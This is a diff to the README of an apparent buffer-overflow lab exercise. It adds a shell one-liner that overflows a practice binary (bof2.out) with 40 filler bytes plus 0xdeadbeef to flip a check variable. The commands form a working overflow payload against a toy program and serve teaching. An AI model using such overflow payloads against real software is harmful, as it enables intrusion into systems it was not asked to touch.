@@ -60,9 +60,9 @@ The Dockerfile is used to build docker image with full required packages for Han
 `$> cd bof` <br>
 3. Overflow memory we need to fill 40 characters + 4 characters of variable check address <br>
 `$>echo $(python -c "print('a'*40+'\xff\xff\xff\xff')") | ./bof2.out` <br>
-4. If you want to print out this statement printf("\nYou are on the right way!\n") <br>
 ![image](https://github.com/user-attachments/assets/548b9b77-c695-48af-9e64-7334b3b7626d)
-5.Else print out this statement printf("Yeah! You win!\n") <br>
+4. Else print out this statement printf("Yeah! You win!\n") <br>
+`$>echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out` <br>
 ![image](https://github.com/user-attachments/assets/738be82f-7ceb-487d-9b3b-2a985bde5b0f)
 
 
